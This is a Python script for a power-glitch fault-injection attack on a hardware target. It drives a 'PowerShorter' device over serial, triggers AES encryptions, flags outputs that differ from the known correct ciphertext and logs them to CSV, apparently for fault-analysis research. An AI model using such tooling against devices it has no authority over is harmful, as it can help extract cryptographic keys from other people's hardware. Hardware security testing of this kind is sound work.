import time
import random
import binascii
import serial
import csv
import os
from tqdm import trange
from power_shorter import PowerShorter, Engine, RELAY


class FaultAttack:
    def __init__(
        self,
        shorter_port="/dev/ttyUSB0",
        target_port="/dev/ttyACM0",
        baudrate=38400,
        pulse_min=8,
        pulse_max=9,
        delay_min=435600,
        delay_max=442400,
    ):
        self.ps = PowerShorter(shorter_port)
        self.target_port = target_port
        self.baudrate = baudrate
        self.correct_text = "539ba31a988912a8bd8cec9331477402"
        self.pulse_min = pulse_min
        self.pulse_max = pulse_max
        self.delay_min = delay_min
        self.delay_max = delay_max

    def reset_device(self):
        self.ps.relay(RELAY.RELAY2, 1)
        time.sleep(1)
        self.ps.relay(RELAY.RELAY2, 0)
        time.sleep(2)

    def attack(self, times=100, csv_path="attack_results.csv"):
        results = []
        print(f"Starting fault attack with {times} attempts...")

        # Reset device only once at the start of the attack
        print("Resetting target device...")
        self.reset_device()
        with serial.Serial(self.target_port, self.baudrate, timeout=0) as target_device:
            for _ in trange(1, times + 1):
                glitch_pulse = random.randint(self.pulse_min, self.pulse_max)
                glitch_delay = random.randint(self.delay_min, self.delay_max)
                self.ps.engine_cfg(
                    Engine.E2, [(0, glitch_delay), (1, glitch_pulse), (0, 1)]
                )
                self.ps.arm(Engine.E2)
                target_device.reset_input_buffer()
                target_device.reset_output_buffer()
                target_device.write(b"AES\n")
                time.sleep(1)
                binary_response = target_device.read(32)
                glitch_text = ""
                state = ""
                is_success = False
                if binary_response:
                    glitch_text = binary_response.decode("ascii", errors="replace")
                    state = self.ps.state(Engine.E2)
                    if state == "glitched" and glitch_text != self.correct_text:
                        is_success = True

                results.append(
                    {
                        "glitch_pulse": glitch_pulse,
                        "glitch_delay": glitch_delay,
                        "state": state,
                        "glitch_text": glitch_text,
                        "is_success": is_success,
                    }
                )

        # Print summary
        successful_attempts = sum(1 for result in results if result["is_success"])
        print(
            f"\nAttack complete. {successful_attempts} successful glitches out of {times} attempts."
        )

        # Write results to CSV
        file_exists = os.path.isfile(csv_path)
        with open(csv_path, "a", newline="") as csvfile:
            fieldnames = [
                "glitch_pulse",
                "glitch_delay",
                "state",
                "glitch_text",
                "is_success",
            ]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            if not file_exists or os.stat(csv_path).st_size == 0:
                writer.writeheader()
            for row in results:
                writer.writerow(row)

        print(f"Results saved to {csv_path}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Run FaultAttack glitch attempts.")
    parser.add_argument(
        "--times", type=int, default=100, help="Number of attack attempts"
    )
    parser.add_argument(
        "--csv",
        type=str,
        default="data/attack_results.csv",
        help="CSV output file path",
    )
    parser.add_argument(
        "--shorter_port",
        type=str,
        default="/dev/ttyUSB0",
        help="PowerShorter serial port",
    )
    parser.add_argument(
        "--target_port",
        type=str,
        default="/dev/ttyACM0",
        help="Target device serial port",
    )
    parser.add_argument(
        "--baudrate", type=int, default=38400, help="Target device baudrate"
    )
    args = parser.parse_args()

    attacker = FaultAttack(
        shorter_port=args.shorter_port,
        target_port=args.target_port,
        baudrate=args.baudrate,
        pulse_min=20,
        pulse_max=22,
        delay_min=435600,
        delay_max=444400,
    )
    attacker.attack(times=args.times, csv_path=args.csv)
